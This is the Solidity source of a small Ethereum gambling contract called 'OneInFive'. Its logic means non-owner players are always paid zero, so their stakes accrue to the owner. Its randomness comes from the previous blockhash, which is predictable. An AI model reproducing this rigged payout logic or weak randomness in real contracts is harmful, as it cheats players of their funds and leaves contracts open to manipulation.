/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OneInFive at 0x762788f4f1c0ab1f2b5c13604f377f51cc1942ee
*/
pragma solidity ^0.4.0;

contract OneInFive{
    
    event SpiceUpPot();
    
    mapping(address => uint256) balance;
    
    address owner;
    
    constructor() public payable{
        require(msg.value >= .06 ether);
        owner = msg.sender;
    }
    
    function gamble() public payable{
        require(msg.value >= .01 ether);
        if(msg.sender!=owner || rollIt()){
            withdrawPlayer();
        }
        else if(msg.sender==owner){
            emit SpiceUpPot();
        }
    }
    
    function rollIt() private returns(bool){
        bytes32 hash = keccak256(blockhash(block.number-1));
        uint256 random = uint256(hash);
        if(random%5==0){
            balance[msg.sender] = address(this).balance;
            return true;
        }
        else{
            return false;
        }
    }
    
    function withdrawPlayer() internal{
        uint256 amount = balance[msg.sender];
        balance[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
    
    function withdrawOwner() public{
        if(msg.sender==owner){
            owner.transfer(address(this).balance);
        }
    }
    function() public payable{
        gamble();
    }
    
}